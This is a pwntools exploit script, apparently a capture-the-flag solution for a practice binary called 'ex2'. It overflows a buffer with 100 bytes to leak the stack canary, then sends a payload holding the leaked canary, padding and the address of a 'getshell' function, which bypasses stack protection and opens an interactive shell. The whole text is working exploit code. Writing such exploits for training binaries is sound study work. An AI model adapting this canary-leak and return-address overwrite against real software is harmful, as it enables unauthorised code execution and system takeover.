
from pwn import *

context.binary = 'ex2'
context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]
print(hex(get_shell))

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary).decode("latin-1")+"\x90"*8+p32(get_shell).decode("latin-1")
io.send(payload)

io.recv()

io.interactive()